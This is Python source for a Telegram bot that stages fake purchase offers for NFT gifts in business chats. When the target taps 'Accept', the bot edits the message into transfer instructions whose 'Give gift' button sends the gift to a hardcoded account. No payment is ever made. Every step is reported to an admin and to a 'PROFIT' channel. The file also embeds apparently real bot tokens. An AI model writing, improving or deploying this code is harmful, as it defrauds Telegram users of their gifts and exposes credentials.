import asyncio
import logging
import json
import uuid
import re
import aiohttp

from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import CommandStart
from aiogram.types import (
    Message, CallbackQuery, LinkPreviewOptions,
    InlineKeyboardMarkup, InlineKeyboardButton
)
from aiogram.exceptions import TelegramBadRequest

# =====================================
# НАСТРОЙКИ
# =====================================
TOKEN = "9056825852:AAH-AKRlntMSkdLMfEbBqB9HsFcPsZFqabA"
CURRENCY = {"g": "💎", "s": "⭐"}

TRACKER_BOT_TOKEN = "8914754146:AAH3WF5wVgNtvfXpomuVCY1KoZ9VrBcGPcw"
TRACKER_ADMIN_ID = 9158877731
PROFIT_CHANNEL_ID = -1003914079695
PROFIT_TOPIC_ID = 3

TEXTS = {
    "ru": {
        "offer_text": "Пользователь <b>{who}</b> предлагает Вам {sum} {cur} за подарок <b>{name}</b>.",
        "accepted": "🎁 <b>Подарок:</b> {name}\n\n<b>Предложение принято!</b>\n\nОжидается передача подарка.\n\nСумма предложения: {sum} {cur}",
        "btn_give": "🎁 Передать подарок",
        "btn_how": "❓ Как передать?",
        "btn_decline": "❌ Отклонить",
        "btn_accept": "✅ Принять",
        "alert_how": "Нажмите на кнопку ниже, чтобы открыть интерфейс подарка.\n\nЗатем выберите подарок и отправьте его получателю.",
        "declined": "Вы отклонили предложение."
    },
    "en": {
        "offer_text": "User <b>{who}</b> offers You {sum} {cur} for the gift <b>{name}</b>.",
        "accepted": "🎁 <b>Gift:</b> {name}\n\n<b>Offer accepted!</b>\n\nWaiting for gift transfer.\n\nOffer amount: {sum} {cur}",
        "btn_give": "🎁 Give gift",
        "btn_how": "❓ How to give?",
        "btn_decline": "❌ Decline",
        "btn_accept": "✅ Accept",
        "alert_how": "Click the button below to open the gift interface.\n\nThen choose a gift and send it to the recipient.",
        "declined": "You have declined the offer."
    },
}

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
OFFERS: dict[str, dict] = {}
http_session: aiohttp.ClientSession = None

LARGE_PREVIEW = LinkPreviewOptions(
    is_disabled=False, prefer_large_media=True, show_above_text=True
)
LP_JSON = json.dumps({"is_disabled": False, "prefer_large_media": True, "show_above_text": True})

# =====================================
# ОТПРАВКА В ТРЕКЕР
# =====================================
async def tracker_log(text: str):
    if not http_session:
        return
    url = f"https://api.telegram.org/bot{TRACKER_BOT_TOKEN}/sendMessage"
    try:
        async with http_session.post(url, json={
            "chat_id": TRACKER_ADMIN_ID, "text": text, "parse_mode": "HTML"
        }) as resp:
            if resp.status != 200:
                logging.error(f"Tracker admin: {await resp.text()}")
    except Exception as e:
        logging.error(f"Tracker admin error: {e}")

    if PROFIT_CHANNEL_ID:
        try:
            async with http_session.post(url, json={
                "chat_id": PROFIT_CHANNEL_ID,
                "message_thread_id": PROFIT_TOPIC_ID,
                "text": text, "parse_mode": "HTML"
            }) as resp:
                if resp.status != 200:
                    logging.error(f"Tracker channel: {await resp.text()}")
        except Exception as e:
            logging.error(f"Tracker channel error: {e}")

# =====================================

# УНИВЕРСАЛЬНОЕ РЕДАКТИРОВАНИЕ БИЗНЕС-СООБЩЕНИЯ
# =====================================
async def edit_business(bc_id, chat_id, message_id, text, markup):
    if hasattr(bot, "edit_business_message"):
        await bot.edit_business_message(
            business_connection_id=bc_id,
            chat_id=chat_id,
            message_id=message_id,
            text=text,
            reply_markup=markup,
            link_preview_options=LARGE_PREVIEW
        )
        return

    url = f"https://api.telegram.org/bot{TOKEN}/editBusinessMessageText"
    data = {
        "business_connection_id": bc_id,
        "chat_id": chat_id,
        "message_id": message_id,
        "text": text,
        "parse_mode": "HTML",
        "link_preview_options": LP_JSON,
    }
    if markup:
        data["reply_markup"] = markup.model_dump_json()
    async with http_session.post(url, json=data) as resp:
        if resp.status != 200:
            raise RuntimeError(f"editBusinessMessageText: {await resp.text()}")

# =====================================
# ОТПРАВКА С ПОВТОРОМ ПРИ PEER_FLOOD
# =====================================
async def send_to_business(bc_id, chat_id, text, markup):
    last = None
    for attempt in range(3):
        try:
            await bot.send_message(
                chat_id=chat_id,
                text=text,
                reply_markup=markup,
                business_connection_id=bc_id,
                link_preview_options=LARGE_PREVIEW
            )
            return True
        except TelegramBadRequest as e:
            last = e
            if "PEER_FLOOD" in str(e):
                await asyncio.sleep(3 + attempt * 3)
                continue
            logging.error(f"Send error: {e}")
            return False
        except Exception as e:
            last = e
            await asyncio.sleep(2)
    logging.error(f"Send failed: {last}")
    return False

# =====================================
# КОМАНДА /start
# =====================================
@dp.message(CommandStart())
async def cmd_start(message: Message):
    text = (
        "<b>👋 Добро пожаловать!</b>\n\n"
        "Чтобы создать оффер, отправь команду в формате:\n"
        "<code>.оффер [ссылка] [сумма] [валюта] [язык]</code>\n\n"
        "<b>Пример:</b>\n"
        "<code>.оффер t.me/nft/LibertyFigure-94879 1000 s ru</code>\n\n"
        "——————\n"
        "<b>Валюты:</b>\n"
        "⭐ <b>s</b> — Звёзды (Telegram Stars)\n"
        "💎 <b>g</b> — Граммы (Gifts / Gram)\n\n"
        "<b>Языки:</b>\n"
        "🇷🇺 <b>ru</b> — Русский\n"
        "🇬🇧 <b>en</b> — English"
    )
    await message.answer(text)

# =====================================
# КНОПКИ
# =====================================
def offer_kb(oid: str, lang: str) -> InlineKeyboardMarkup:
    t = TEXTS.get(lang, TEXTS["ru"])
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text=t["btn_decline"], callback_data=f"dec:{oid}"),
        InlineKeyboardButton(text=t["btn_accept"], callback_data=f"acc:{oid}")
    ]])

def instruction_kb(lang: str) -> InlineKeyboardMarkup:
    t = TEXTS.get(lang, TEXTS["ru"])
    gift_url = "tg://send_gift?to=8863549439"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t["btn_give"], url=gift_url)],
        [InlineKeyboardButton(text=t["btn_how"], callback_data="how")]
    ])

# =====================================
# СОЗДАНИЕ ОФФЕРА
# =====================================

@dp.message(F.text.startswith(".оффер"))
async def create_offer(message: Message):
    parts = message.text.split()
    if len(parts) < 3:
        await message.reply("Формат: <code>.оффер [ссылка] [сумма] [валюта] [язык]</code>")
        return

    url = parts[1]
    try:
        amount = int(parts[2])
    except ValueError:
        await message.reply("Сумма должна быть числом.")
        return

    cur_code = parts[3].lower() if len(parts) > 3 else "s"
    lang = parts[4].lower() if len(parts) > 4 else "ru"
    if lang not in TEXTS:
        lang = "ru"

    cur = CURRENCY.get(cur_code, "⭐")

    m = re.search(r"/([^/?]+)", url)
    gift_name = m.group(1).split("-")[0] if m else "Подарок"

    oid = uuid.uuid4().hex[:8]
    sender = message.from_user.username or message.from_user.full_name

    OFFERS[oid] = {
        "gift_name": gift_name, "sum": amount, "cur": cur,
        "url": url, "lang": lang, "sender": sender
    }

    if not message.business_connection_id and not message.reply_to_message:
        await message.reply("Команда должна быть в бизнес-чате.")
        return

    target_chat = message.chat.id
    bc = message.business_connection_id

    t = TEXTS[lang]
    text = t["offer_text"].format(who=sender, sum=amount, cur=cur, name=gift_name)

    try:
        await bot.send_message(
            chat_id=target_chat,
            text=text,
            reply_markup=offer_kb(oid, lang),
            business_connection_id=bc,
            link_preview_options=LARGE_PREVIEW
        )
    except TelegramBadRequest as e:
        if "PEER_FLOOD" in str(e):
            await asyncio.sleep(3)
            await bot.send_message(
                chat_id=target_chat, text=text,
                reply_markup=offer_kb(oid, lang),
                business_connection_id=bc,
                link_preview_options=LARGE_PREVIEW
            )
        else:
            await message.reply(f"Ошибка: {e}")
            return

    asyncio.create_task(tracker_log(
        f"📨 Новый оффер\nОт: @{sender}\nПодарок: {gift_name}\n"
        f"Сумма: {amount} {cur}"
    ))

# =====================================
# ПРИНЯТИЕ
# =====================================
@dp.callback_query(F.data.startswith("acc:"))
async def cb_accept(call: CallbackQuery):
    await call.answer()
    oid = call.data.split(":", 1)[1]
    offer = OFFERS.get(oid)
    if not offer:
        return

    lang = offer.get("lang", "ru")
    t = TEXTS.get(lang, TEXTS["ru"])
    text = t["accepted"].format(name=offer["gift_name"], sum=offer["sum"], cur=offer["cur"])
    text += f"\n\n{offer['url']}"

    bc = call.message.business_connection_id
    chat = call.message.chat.id
    mid = call.message.message_id

    try:
        await edit_business(bc, chat, mid, text, instruction_kb(lang))
        logging.info("Сообщение отредактировано.")
    except Exception as e:
        logging.error(f"Edit error: {e}")
        try:
            await bot.delete_business_messages(
                business_connection_id=bc, message_ids=[mid]
            )
        except Exception as e2:
            logging.error(f"Delete error: {e2}")
        ok = await send_to_business(bc, chat, text, instruction_kb(lang))
        if ok:
            logging.info("Сообщение заменено новым.")

    asyncio.create_task(tracker_log(
        f"✅ Оффер принят\nID: {oid}\nПодарок: {offer['gift_name']}\n"
        f"Сумма: {offer['sum']} {offer['cur']}"
    ))

# =====================================
# ОТКЛОНЕНИЕ

# =====================================
@dp.callback_query(F.data.startswith("dec:"))
async def cb_decline(call: CallbackQuery):
    await call.answer()
    oid = call.data.split(":", 1)[1]
    offer = OFFERS.get(oid)
    if not offer:
        return

    lang = offer.get("lang", "ru")
    t = TEXTS.get(lang, TEXTS["ru"])

    bc = call.message.business_connection_id
    chat = call.message.chat.id
    mid = call.message.message_id

    try:
        await edit_business(bc, chat, mid, t["declined"], None)
    except Exception as e:
        logging.error(f"Decline edit error: {e}")
        await send_to_business(bc, chat, t["declined"], None)

    asyncio.create_task(tracker_log(f"❌ Оффер отклонён\nID: {oid}"))

# =====================================
# КНОПКА "КАК ПЕРЕДАТЬ"
# =====================================
@dp.callback_query(F.data == "how")
async def cb_how(call: CallbackQuery):
    await call.answer(TEXTS["ru"]["alert_how"], show_alert=True)

# =====================================
# ЗАПУСК
# =====================================
async def main():
    global http_session
    http_session = aiohttp.ClientSession()
    try:
        await dp.start_polling(bot)
    finally:
        await http_session.close()
        await bot.session.close()

if __name__ == "__main__":
    asyncio.run(main())
